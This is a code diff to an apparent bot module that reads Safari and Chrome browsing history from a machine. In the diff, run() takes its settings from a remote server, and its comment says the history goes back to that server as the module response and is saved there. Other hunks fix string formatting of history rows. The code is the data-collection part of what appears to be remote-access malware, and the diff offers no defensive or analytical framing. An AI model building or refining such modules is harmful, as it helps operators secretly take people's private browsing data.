@@ -27,8 +27,8 @@ def print_safari_history(history_limit, output_file):
             if not output_file:
                 string_builder += "Safari history: \n"
 
-                for item in statement[number:]:
-                    string_builder += " -> ".join(item)
+                for safari_item in statement[number:]:
+                    string_builder += " -> ".join(str(part) for part in safari_item)
                     string_builder += "\n"
             else:
                 with open(output_file, "a+") as out:
@@ -64,7 +64,7 @@ def print_chrome_history(history_limit, output_file):
                 string_builder += "Chrome history: "
 
                 for item in statement[number:]:
-                    string_builder += item
+                    string_builder += " -> ".join(str(part) for part in item)
                     string_builder += "\n"
             else:
                 # Write output to file.
@@ -79,8 +79,14 @@ def print_chrome_history(history_limit, output_file):
 
 
 def run(options):
-    print_safari_history(options["history_limit"], options["output_file"])
-    print_chrome_history(options["history_limit"], options["output_file"])
+    # The server sends {"history_limit": int, "response_options": {"output_name": ...}}.
+    # History is written back as the module response; the server saves it locally,
+    # so the bot never needs an output path of its own.
+    history_limit = options.get("history_limit", 10)
+    try:
+        history_limit = int(history_limit)
+    except (TypeError, ValueError):
+        history_limit = 10
 
-    if options["output_file"]:
-        print("[browser_history] History saved to: " + options["output_file"])
+    print_safari_history(history_limit, None)
+    print_chrome_history(history_limit, None)
